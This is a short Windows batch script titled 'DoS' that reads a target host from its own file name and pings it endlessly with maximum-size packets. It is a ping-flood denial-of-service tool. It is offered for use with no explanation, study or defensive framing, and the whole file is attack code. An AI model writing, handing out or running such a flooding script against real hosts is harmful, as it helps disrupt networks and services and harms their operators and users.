@echo off

MODE 25,1
title DoS
color 0A
echo | set /p="Target: %~n0"

:loop
ping %~n0 -l 65500 -n 1 -w 1 > nul
goto :loop
